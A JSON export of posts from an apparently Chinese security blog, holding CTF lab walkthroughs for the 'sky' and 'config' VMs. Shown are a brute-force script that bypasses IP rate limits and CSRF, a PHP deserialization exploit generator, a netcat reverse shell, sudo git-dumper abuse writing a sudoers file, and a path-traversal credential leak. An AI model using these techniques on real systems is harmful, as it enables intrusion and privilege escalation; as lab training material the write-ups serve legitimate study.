\u6743\u9650\u540e\uff0c\u8bfb\u53d6\u6700\u7ec8\u7684 flag\u3002\n\n```bash\nroot@Node:/# cat /root/root.txt /home/hungry/user.txt\nflag{root-c946739aa8e0f1008c32e311076f355f}\nflag{user-8c4b1157cb6f8884aa183ac0f1447e6c}\n```\n\nsentence", "top": 0, "createdAt": 1754441282, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P179": {"htmlDir": "docs/post/nei-bu-_sky.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_sky", "postUrl": "post/nei-bu-_sky.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/179", "commentNum": 0, "wordCount": 10946, "description": "![image-20250728205701542](http://7r1UMPHK.github.io/image/20250728205701809.webp)\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u4f7f\u7528 `arp-scan` \u626b\u63cf\u672c\u5730\u7f51\u7edc\uff0c\u53d1\u73b0\u76ee\u6807\u4e3b\u673a IP \u5730\u5740\u4e3a `192.168.205.230`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ sudo arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n...\n192.168.205.230 08:00:27:03:0e:34       PCS Systemtechnik GmbH\n...\n```\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u7aef\u53e3\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ nmap -p- 192.168.205.230\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 08:58 EDT\nNmap scan report for 192.168.205.230\nHost is up (0.00016s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:03:0E:34 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n## 3. Web \u76ee\u5f55\u679a\u4e3e\n\n\u4f7f\u7528 `gobuster` \u5bf9 Web \u670d\u52a1\u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u591a\u4e2a PHP \u6587\u4ef6\uff0c\u5305\u62ec `login.php`, `check.php`, `secret.php` \u7b49\u5173\u952e\u9875\u9762\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n\u2514\u2500$ gobuster dir -u http://192.168.205.230 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\n[+] Url:                     http://192.168.205.230\n...\n/index.html           (Status: 200)\n/login.php            (Status: 200)\n/logout.php           (Status: 302) --> login.php\n/check.php            (Status: 200)\n/ok.php               (Status: 302) --> login.php\n/secret.php           (Status: 200)\n...\n===============================================================\n```\n\n# \u4e8c\u3001\u521d\u59cb\u8bbf\u95ee\n\n## Web \u6e17\u900f (Port 80)\n\n### 1. \u767b\u5f55\u7ed5\u8fc7\u4e0e\u7206\u7834\n\n\u8bbf\u95ee `http://192.168.205.230`\uff0c\u8fdb\u5165\u4e00\u4e2a\u767b\u5f55\u9875\u9762\u3002`secret.php` \u9875\u9762\u63d0\u793a\u201c\u5927\u95e8\u4f3c\u4e4e\u65e0\u6cd5\u88ab\u66b4\u529b\u6253\u5f00\u201d\uff0c\u6697\u793a\u53ef\u80fd\u5b58\u5728\u9632\u7206\u7834\u673a\u5236\u3002\n\n\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53d1\u73b0\u767b\u5f55\u9a8c\u8bc1\u63a5\u53e3 `check.php` \u5b58\u5728 CSRF Token \u6821\u9a8c\uff0c\u5e76\u4e14\u6709\u57fa\u4e8e IP \u7684\u767b\u5f55\u5c1d\u8bd5\u9650\u5236\u3002\u901a\u8fc7\u5728 HTTP \u8bf7\u6c42\u5934\u4e2d\u4f2a\u9020 `X-Forwarded-For` \u5b57\u6bb5\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u6b64 IP \u9650\u5236\u3002\n\n\u7f16\u5199 Python \u811a\u672c\uff0c\u5728\u6bcf\u6b21\u5c1d\u8bd5\u5bc6\u7801\u524d\u90fd\u5148\u8bf7\u6c42\u767b\u5f55\u9875\u83b7\u53d6\u65b0\u7684 CSRF Token\uff0c\u5e76\u4f2a\u9020\u6765\u6e90 IP\uff0c\u6210\u529f\u7206\u7834\u51fa `admin` \u7528\u6237\u7684\u5bc6\u7801\u4e3a `superman1`\u3002\n\n**\u653b\u51fb\u811a\u672c**\n\n```python\nimport requests\nimport re\nfrom time import sleep\nfrom random import randint\n\nLOGIN_URL = 'http://192.168.205.230/login.php'\nCHECK_URL = 'http://192.168.205.230/check.php'\nUSERNAME = 'admin'\nPASSWORD_LIST_PATH = '/usr/share/wordlists/rockyou.txt'\n\ndef gen_ip():\n    return f'{randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}'\n\ndef main():\n    print('--- \u5f00\u59cb\u653b\u51fb ---')\n    print(f'[*] \u76ee\u6807URL: {CHECK_URL}')\n    print(f'[*] \u7528\u6237\u540d: {USERNAME}')\n    print(f'[*] \u5bc6\u7801\u5b57\u5178: {PASSWORD_LIST_PATH}')\n    print('-' * 20)\n\n    session = requests.Session()\n\n    try:\n        with open(PASSWORD_LIST_PATH, 'r', encoding='latin-1') as f:\n            for pwd in f:\n                pwd = pwd.strip()\n                if not pwd:\n                    continue\n\n                try:\n                    ip = gen_ip()\n                    headers = {\n                        'X-Forwarded-For': ip,\n                        'X-Originating-IP': ip,\n                        'X-Remote-IP': ip,\n                        'X-Remote-Addr': ip\n                    }\n                    \n                    print(f'[*] \u6b63\u5728\u4e3a\u5bc6\u7801 '{pwd}' \u83b7\u53d6\u65b0Token... (IP: {ip})')\n                    r = session.get(LOGIN_URL, headers=headers)\n                    token_match = re.search(r'id='csrfToken' value='([a-f0-9]{16})'', r.text)\n                    if not token_match:\n                        print('[!] \u65e0\u6cd5\u83b7\u53d6Token\uff0c\u53ef\u80fd\u88ab\u5c01IP\u6216\u9875\u9762\u53d8\u66f4\u3002')\n                        break\n\n                    token = token_match.group(1)\n                    print(f'[*] \u83b7\u53d6\u6210\u529f, Token: {token}')\n\n                    data = {\n                        'username': USERNAME,\n                        'password': pwd,\n                        'csrf_token': token\n                    }\n\n                    res = session.post(CHECK_URL, data=data, headers=headers)\n                    print(f'[*] \u6b63\u5728\u5c1d\u8bd5\u5bc6\u7801: {pwd}')\n\n                    if '\u5bc6\u7801\u9519\u8bef' not in res.text and '\u7528\u6237\u540d\u9519\u8bef' not in res.text and '\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\u8fc7\u591a' not in res.text:\n                        print('\\n' + '='*40)\n                        print(f'[+] !!! \u653b\u51fb\u6210\u529f !!!')\n                        print(f'[+] \u7528\u6237\u540d: {USERNAME}')\n                        print(f'[+] \u5bc6\u7801: {pwd}')\n                        print(f'[+] \u54cd\u5e94\u5185\u5bb9: {res.text}')\n                        print('='*40)\n                        return\n\n                    if '\u7528\u6237\u540d\u9519\u8bef' in res.text:\n                        print('[!] \u7528\u6237\u540d\u9519\u8bef\uff0c\u505c\u6b62\u7206\u7834\u3002')\n                        return\n                        \n                    if '\u767b\u5f55\u5c1d\u8bd5\u6b21\u6570\u8fc7\u591a' in res.text:\n                        print('[!] \u8d26\u6237\u88ab\u9501\u5b9a\uff0c\u7a0d\u7b495\u5206\u949f...')\n                        sleep(300)\n\n                except requests.RequestException as e:\n                    print(f'[!] \u8bf7\u6c42\u5f02\u5e38: {e}')\n                    sleep(5)\n\n    except FileNotFoundError:\n        print(f'[!] \u5bc6\u7801\u5b57\u5178\u672a\u627e\u5230: {PASSWORD_LIST_PATH}')\n    except Exception as e:\n        print(f'[!] \u672a\u77e5\u9519\u8bef: {e}')\n\nif __name__ == '__main__':\n    main()\n```\n\n### 2. PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\n\n![image-20250728210931335](http://7r1UMPHK.github.io/image/20250728210932754.webp)\n\n\u6210\u529f\u767b\u5f55\u540e\uff0c\u53d1\u73b0 `ok.php` \u9875\u9762\u5b58\u5728 PHP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u5176\u4ee3\u7801\u5982\u4e0b\uff1a\n\n```php\nif (isset($_GET['data'])) {\n    $data = $_GET['data'];\n    unserialize($data);\n}\n```\n\n`unserialize` \u51fd\u6570\u7684\u53c2\u6570\u76f4\u63a5\u53d6\u81ea GET \u8bf7\u6c42\uff0c\u5b58\u5728\u4e25\u91cd\u5b89\u5168\u98ce\u9669\u3002\u901a\u8fc7\u5206\u6790\u5e94\u7528\u7a0b\u5e8f\u7684\u7c7b\uff08`UserSession`, `CacheManager`, `FileHandler`, `SystemExecutor`\uff09\uff0c\u53ef\u4ee5\u6784\u9020\u4e00\u6761 POP (Property-Oriented Programming) \u94fe\uff0c\u6700\u7ec8\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002\n\n**POP \u94fe\u5229\u7528\u601d\u8def\uff1a**\n`UserSession` -> `CacheManager` -> `FileHandler` -> `SystemExecutor`\n\n\u901a\u8fc7\u6b64\u94fe\u6761\uff0c\u6700\u7ec8\u4f1a\u89e6\u53d1 `SystemExecutor` \u7c7b\u4e2d\u7684 `__destruct` \u65b9\u6cd5\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002\n\n**Payload \u751f\u6210\u811a\u672c:**\n\n```python\nimport urllib.parse\n\nclass SystemExecutor: pass\nclass FileHandler: __init__ = lambda s,p,f: setattr(s,'process',p) or setattr(s,'filename',f)\nclass CacheManager: __init__ = lambda s,c: setattr(s,'cacheFile',c)\nclass UserSession: __init__ = lambda s,l: setattr(s,'logger',l)\n\ndef php_ser(obj):\n    if isinstance(obj, str):\n        return f's:{len(obj)}:'{obj}';'\n    if isinstance(obj, SystemExecutor):\n        return 'O:14:'SystemExecutor':0:{}'\n    if isinstance(obj, FileHandler):\n        d = php_ser('process')+php_ser(obj.process)\n        d += php_ser('filename')+php_ser(obj.filename)\n        return f'O:11:'FileHandler':2:{{{d}}}'\n    if isinstance(obj, CacheManager):\n        d = php_ser('cacheFile')+php_ser(obj.cacheFile)\n        return f'O:12:'CacheManager':1:{{{d}}}'\n    if isinstance(obj, UserSession):\n        d = php_ser('logger')+php_ser(obj.logger)\n        return f'O:11:'UserSession':1:{{{d}}}'\n    return 'N;'\n\ndef g():\n    c = input('\u8f93\u5165\u547d\u4ee4: ').strip()\n    e = SystemExecutor()\n    f = FileHandler(e, c)\n    cm = CacheManager(f)\n    us = UserSession(cm)\n    p = php_ser(us)\n    u = f'http://192.168.205.230/ok.php?data={urllib.parse.quote(p)}'\n    print(f'[*] \u5e8f\u5217\u5316\u5b57\u7b26\u4e32:\\n{p}\\n')\n    print(f'[*] \u653b\u51fbURL:\\n{u}')\n\nif __name__ == '__main__':\n    g()\n```\n\n\u5c1d\u8bd5\u5229\u7528\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 b.py\n\u8f93\u5165\u547d\u4ee4: id\n[*] \u5e8f\u5217\u5316\u5b57\u7b26\u4e32:\nO:11:'UserSession':1:{s:6:'logger';O:12:'CacheManager':1:{s:9:'cacheFile';O:11:'FileHandler':2:{s:7:'process';O:14:'SystemExecutor':0:{}s:8:'filename';s:2:'id';}}}\n\n[*] \u653b\u51fbURL:\nhttp://192.168.205.230/ok.php?data=O%3A11%3A%22UserSession%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A12%3A%22CacheManager%22%3A1%3A%7Bs%3A9%3A%22cacheFile%22%3BO%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A7%3A%22process%22%3BO%3A14%3A%22SystemExecutor%22%3A0%3A%7B%7Ds%3A8%3A%22filename%22%3Bs%3A2%3A%22id%22%3B%7D%7D%7D\n```\n\n\u53bbweb\u770b\u4e86\u4e00\u4e0b\uff0c\u8fd4\u56de\u4e86good\uff0c\u90a3\u5f39shell\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 b.py\n\u8f93\u5165\u547d\u4ee4: busybox nc 192.168.205.128 8888 -e /bin/bash\n[*] \u5e8f\u5217\u5316\u5b57\u7b26\u4e32:\nO:11:'UserSession':1:{s:6:'logger';O:12:'CacheManager':1:{s:9:'cacheFile';O:11:'FileHandler':2:{s:7:'process';O:14:'SystemExecutor':0:{}s:8:'filename';s:44:'busybox nc 192.168.205.128 8888 -e /bin/bash';}}}\n\n[*] \u653b\u51fbURL:\nhttp://192.168.205.230/ok.php?data=O%3A11%3A%22UserSession%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A12%3A%22CacheManager%22%3A1%3A%7Bs%3A9%3A%22cacheFile%22%3BO%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A7%3A%22process%22%3BO%3A14%3A%22SystemExecutor%22%3A0%3A%7B%7Ds%3A8%3A%22filename%22%3Bs%3A44%3A%22busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash%22%3B%7D%7D%7D\n```\n\n\u5728\u672c\u5730\u4f7f\u7528 `netcat` \u5f00\u542f\u76d1\u542c\uff0c\u7136\u540e\u8bbf\u95ee\u6784\u9020\u597d\u7684 URL\uff0c\u6210\u529f\u63a5\u6536\u5230 `www-data` \u7528\u6237\u7684\u53cd\u5f39 shell\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888           \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.230] 55154\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n# \u4e09\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u4ece `www-data` \u5230 `sky`\n\n\u5728 `www-data` \u7528\u6237\u7684 shell \u4e2d\uff0c\u4e8e\u7f51\u7ad9\u6839\u76ee\u5f55 `/var/www/html` \u4e0b\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3a `ll1045670921.php` \u7684\u53ef\u7591\u6587\u4ef6\u3002\u67e5\u770b\u5176\u5185\u5bb9\uff0c\u83b7\u5f97\u4e86\u4e00\u4e2a\u5bc6\u94a5/\u5bc6\u7801\uff1a`bf4e842c9fea1b77`\u3002\n\n```bash\nwww-data@sky:/var/www/html$ cat ll1045670921.php\n<?php\n...\n// \u770b\u6765\u4f60\u627e\u5230\u4e86\u901a\u5f80\u5929\u7a7a\u7684\u5bc6\u94a5\uff1abf4e842c9fea1b77\n?>\n```\n\n\u901a\u8fc7 `ls /home` \u53d1\u73b0\u5b58\u5728\u7528\u6237 `sky`\u3002\u4f7f\u7528\u8be5\u5bc6\u94a5\u4f5c\u4e3a\u5bc6\u7801\uff0c\u6210\u529f\u5207\u6362\u5230 `sky` \u7528\u6237\uff0c\u5e76\u8bfb\u53d6\u5230\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nwww-data@sky:/var/www/html$ su sky\nPassword: <\u5728\u6b64\u8f93\u5165\u5bc6\u94a5>\nsky@sky:/var/www/html$ cd\nsky@sky:~$ cat user.txt\n# \u606d\u559c\u4f60\uff0c\u627e\u5230\u4e86\u7b2c\u4e00\u4e2a\u56fd\u738b\u79d8\u5b9d\nflag{user-TheNineHeavensBlackMagicScroll}\n```\n\n## 2. \u4ece `sky` \u5230 `root` (`git-dumper` \u63d0\u6743)\n\n\u4f7f\u7528 `sudo -l` \u547d\u4ee4\u68c0\u67e5 `sky` \u7528\u6237\u7684\u6743\u9650\uff0c\u53d1\u73b0\u8be5\u7528\u6237\u53ef\u4ee5\u65e0\u5bc6\u7801\u6267\u884c `/usr/local/bin/git-dumper` \u547d\u4ee4\u3002\n\n```bash\nsky@sky:~$ sudo -l\n...\nUser sky may run the following commands on sky:\n    (ALL) NOPASSWD: /usr/local/bin/git-dumper\n```\n\n`git-dumper` \u5de5\u5177\u7528\u4e8e\u4ece\u7f51\u7ad9\u4e0b\u8f7d\u66b4\u9732\u7684 `.git` \u4ed3\u5e93\u3002\u5176\u63a5\u53d7\u4e24\u4e2a\u4e3b\u8981\u53c2\u6570\uff1a\u6e90 URL \u548c\u8f93\u51fa\u76ee\u5f55\u3002\u7531\u4e8e `sudo` \u5141\u8bb8\u4ee5 root \u8eab\u4efd\u8fd0\u884c\u6b64\u7a0b\u5e8f\uff0c\u5e76\u4e14\u53ef\u4ee5\u6307\u5b9a\u4efb\u610f\u8f93\u51fa\u76ee\u5f55\uff0c\u8fd9\u4fbf\u6784\u6210\u4e86\u4e00\u4e2a\u5178\u578b\u7684**\u4efb\u610f\u6587\u4ef6\u5199\u5165**\u6f0f\u6d1e\u3002 \u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6b64\u6f0f\u6d1e\u5411 `/etc/sudoers.d/` \u76ee\u5f55\u5199\u5165\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 sudoers \u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u800c\u4e3a `sky` \u7528\u6237\u6388\u4e88\u5b8c\u5168\u7684 root \u6743\u9650\u3002\n\n**\u653b\u51fb\u6b65\u9aa4\uff1a**\n\n1.  **\u5728\u653b\u51fb\u673a (Kali) \u4e0a\u521b\u5efa\u6076\u610f git \u4ed3\u5e93\uff1a**\n    *   \u521b\u5efa\u4e00\u4e2a\u65b0\u76ee\u5f55\u5e76\u521d\u59cb\u5316\u4e3a git \u4ed3\u5e93\u3002\n    *   \u5728\u4ed3\u5e93\u4e2d\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff08\u4f8b\u5982 `sky_privs`\uff09\uff0c\u5185\u5bb9\u4e3a `sky ALL=(ALL:ALL) NOPASSWD: ALL`\u3002\n    *   \u5c06\u6b64\u6587\u4ef6\u6dfb\u52a0\u5230 git \u5e76\u63d0\u4ea4\u3002\n    *   \u5728\u4ed3\u5e93\u76ee\u5f55\u4e0b\u542f\u52a8\u4e00\u4e2a\u4e34\u65f6\u7684 HTTP \u670d\u52a1\u5668\u3002\n\n    ```bash\n    # \u5728 Kali \u4e0a\u6267\u884c\n    \u250c\u2500\u2500(kali\u327fkali)-[/tmp]\n    \u2514\u2500$ mkdir git_exploit && cd git_exploit\n    \u250c\u2500\u2500(kali\u327fkali)-[/tmp/git_exploit]\n    \u2514\u2500$ git init\n    \u250c\u2500\u2500(kali\u327fkali)-[/tmp/git_exploit]\n    \u2514\u2500$ echo 'sky ALL=(ALL:ALL) NOPASSWD: ALL' > sky_privs\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/gitexp]\n    \u2514\u2500$ git config user.name 'xxoo'\n    \u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/gitexp]\n    \u2514\u2500$ git config user.email 'xxoo@x.com'\n    \u250c\u2500\u2500(kali\u327fkali)-[/tmp/git_exploit]\n    \u2514\u2500$ git add sky_privs && git commit -m 'pwn'\n    \u250c\u2500\u2500(kali\u327fkali)-[/tmp/git_exploit]\n    \u2514\u2500$ python3 -m http.server 80\n\n2. **\u5728\u9776\u673a\u4e0a\u5229\u7528 `git-dumper` \u5199\u5165\u6587\u4ef6\uff1a**\n\n   *   \u4ee5 `sky` \u7528\u6237\u8eab\u4efd\uff0c\u4f7f\u7528 `sudo` \u6267\u884c `git-dumper`\u3002\n   *   URL \u6307\u5411\u653b\u51fb\u673a\u7684 HTTP \u670d\u52a1\u5668\u3002\n   *   \u8f93\u51fa\u76ee\u5f55\u6307\u5b9a\u4e3a `/etc/sudoers.d/`\u3002`git-dumper` \u4f1a\u5c06\u4ed3\u5e93\u4e2d\u7684\u6587\u4ef6\u6062\u590d\u5230\u8be5\u76ee\u5f55\u3002\n\n   ```bash\n   # \u5728\u9776\u673a\u4e0a\u6267\u884c\n   sky@sky:~$ sudo /usr/local/bin/git-dumper http://192.168.205.128 /etc/sudoers.d/\n   ...\n   [-] Running git checkout .\n   Updated 1 path from the index\n   ```\n\n3. **\u9a8c\u8bc1\u5e76\u83b7\u53d6 Root Shell\uff1a**\n   \u6267\u884c\u6210\u529f\u540e\uff0c\u518d\u6b21\u68c0\u67e5 `sudo` \u6743\u9650\uff0c\u53ef\u4ee5\u770b\u5230\u65b0\u7684\u89c4\u5219\u5df2\u751f\u6548\u3002\u73b0\u5728\u53ef\u4ee5\u76f4\u63a5\u5207\u6362\u5230 root \u7528\u6237\u3002\n\n   ```bash\n   sky@sky:~$ sudo -l\n   ...\n   User sky may run the following commands on sky:\n       (ALL) NOPASSWD: /usr/local/bin/git-dumper\n       (ALL : ALL) NOPASSWD: ALL   <-- \u63d0\u6743\u6210\u529f\uff01\n   \n   sky@sky:~$ sudo bash\n   root@sky:/home/sky# id\n   uid=0(root) gid=0(root) groups=0(root)\n   ```\n\n# \u56db\u3001\u593a\u53d6\u65d7\u5e1c\n\n\u83b7\u53d6 root \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u6240\u6709\u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nroot@sky:/home/sky# cat /home/sky/user.txt /root/root.txt \n# \u606d\u559c\u4f60\uff0c\u627e\u5230\u4e86\u7b2c\u4e00\u4e2a\u56fd\u738b\u79d8\u5b9d\nflag{user-TheNineHeavensBlackMagicScroll}\n# \u606d\u559c\u4f60\uff0c\u627e\u5230\u4e86\u6700\u7ec8\u7684\u738b\u56fd\u79d8\u85cf\nflag{root-TheSwordoftheSky}\n```sentence", "top": 0, "createdAt": 1754441312, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P180": {"htmlDir": "docs/post/nei-bu-_config.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_config", "postUrl": "post/nei-bu-_config.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/180", "commentNum": 0, "wordCount": 5003, "description": "# **\u4e00\u3001\u4fe1\u606f\u6536\u96c6**\n\n## 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u672c\u5730\u7f51\u7edc\u4e2d\u4f7f\u7528 `arp-scan` \u5de5\u5177\u8fdb\u884c\u4e3b\u673a\u53d1\u73b0\uff0c\u786e\u5b9a\u76ee\u6807\u9776\u673a\u7684 IP \u5730\u5740\u4e3a `192.168.205.241`\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l\n...\n192.168.205.241 08:00:27:31:f6:a3       PCS Systemtechnik GmbH\n...\n```\n\n## 2. \u7aef\u53e3\u4e0e\u670d\u52a1\u626b\u63cf\n\n\u4f7f\u7528 `nmap` \u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c\u5168\u7aef\u53e3\u626b\u63cf\uff0c\u53d1\u73b0\u5176\u5f00\u653e\u4e86 22 (SSH) \u548c 80 (HTTP) \u4e24\u4e2a\u7aef\u53e3\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.241\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 07:27 EDT\nNmap scan report for 192.168.205.241\nHost is up (0.000094s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:31:F6:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n## 3. Web\u76ee\u5f55\u679a\u4e3e\u4e0e\u6f0f\u6d1e\u53d1\u73b0\n\n\u8bbf\u95ee 80 \u7aef\u53e3\u662f\u4e00\u4e2a\u9759\u6001\u7f51\u9875\uff0c\u6ca1\u6709\u53ef\u4ea4\u4e92\u7684\u529f\u80fd\u3002\u4f7f\u7528 `gobuster` \u8fdb\u884c\u76ee\u5f55\u7206\u7834\uff0c\u53d1\u73b0\u4e86\u4e00\u4e2a `/config` \u76ee\u5f55\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 64\n...\n/config               (Status: 301) [Size: 169] [--> http://192.168.205.241/config/]\n...\n```\n\n\u5bf9 `/config/` \u76ee\u5f55\u8fdb\u884c\u6df1\u5ea6\u7206\u7834\u672a\u679c\u3002\u5728\u5c1d\u8bd5\u591a\u79cd\u8def\u5f84\u540e\uff0c\u53d1\u73b0 Web \u670d\u52a1\u5668\u5b58\u5728\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\uff0c\u901a\u8fc7\u8bbf\u95ee `/config../` \u53ef\u4ee5\u8df3\u51fa\u5f53\u524d Web \u6839\u76ee\u5f55\u7684\u9650\u5236\u3002\u5229\u7528\u6b64\u6f0f\u6d1e\uff0c\u6211\u4eec\u7ee7\u7eed\u5bf9\u4e0a\u5c42\u76ee\u5f55\u8fdb\u884c\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.241/config../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64\n...\n/config.txt           (Status: 200) [Size: 41]\n...\n```\n\n\u6210\u529f\u53d1\u73b0\u4e86\u4e00\u4e2a\u540d\u4e3a `config.txt` \u7684\u654f\u611f\u6587\u4ef6\u3002\n\n# **\u4e8c\u3001\u521d\u59cb\u8bbf\u95ee**\n\n## 1. \u51ed\u8bc1\u83b7\u53d6\n\n\u4f7f\u7528 `curl` \u8bfb\u53d6\u901a\u8fc7\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e\u53d1\u73b0\u7684 `config.txt` \u6587\u4ef6\uff0c\u6210\u529f\u83b7\u53d6\u5230\u4e00\u7ec4 SSH \u767b\u5f55\u51ed\u8bc1\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://192.168.205.241/config../config.txt\nSSH Credentials: mikannse/mikannsebyebye\n```\n\n\u51ed\u8bc1\u4e3a `mikannse:mikannsebyebye`\u3002\n\n## 2. SSH\u767b\u5f55\u4e0eShell\u9003\u9038\n\n\u5229\u7528\u83b7\u53d6\u5230\u7684\u51ed\u8bc1\u6210\u529f\u767b\u5f55 SSH\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ ssh mikannse@192.168.205.241\n```\n\n\u767b\u5f55\u540e\u53d1\u73b0\u5f53\u524d Shell \u662f\u4e00\u4e2a\u53d7\u9650\u73af\u5883\uff08\u7c7b\u4f3c\u4e8e `less` \u6216 `more`\uff09\uff0c\u65e0\u6cd5\u76f4\u63a5\u6267\u884c\u547d\u4ee4\u3002\u5728\u8fd9\u79cd\u73af\u5883\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7 `less` \u7684\u5185\u90e8\u547d\u4ee4 `!` \u6765\u6267\u884c\u5916\u90e8 Shell \u547d\u4ee4\u3002\u8f93\u5165 `!/bin/bash` \u6210\u529f\u83b7\u5f97\u4e00\u4e2a\u6807\u51c6\u7684 Bash Shell\u3002\n\n# **\u4e09\u3001\u6743\u9650\u63d0\u5347**\n\n## 1. Sudo\u6743\u9650\u5206\u6790\n\n\u83b7\u5f97\u521d\u59cb Shell \u540e\uff0c\u9996\u5148\u67e5\u770b\u5f53\u524d\u7528\u6237 `mikannse` \u7684\u5bb6\u76ee\u5f55\uff0c\u5e76\u8bfb\u53d6 `user.txt` \u83b7\u5f97\u7b2c\u4e00\u4e2a flag\u3002\n\n```bash\nmikannse@Config:~$ ls -al\ntotal 36\ndrwx------ 2 mikannse mikannse 4096 Jul  5 00:50 .\ndrwxr-xr-x 3 root     root     4096 Jul  4 23:36 ..\n-rw-r--r-- 1 mikannse mikannse  175 Jul  4 23:37 banner.txt\nlrwxrwxrwx 1 root     root        9 Jul  4 23:40 .bash_history -> /dev/null\n-rw-r--r-- 1 mikannse mikannse  220 Jul  4 23:36 .bash_logout\n-rw-r--r-- 1 mikannse mikannse 3526 Jul  4 23:36 .bashrc\n-rw------- 1 mikannse mikannse   33 Jul  5 00:50 .lesshst\n-rw-r--r-- 1 root     root      551 Jul  5 00:50 mikannse.conf\n-rw-r--r-- 1 mikannse mikannse  847 Jul  4 23:38 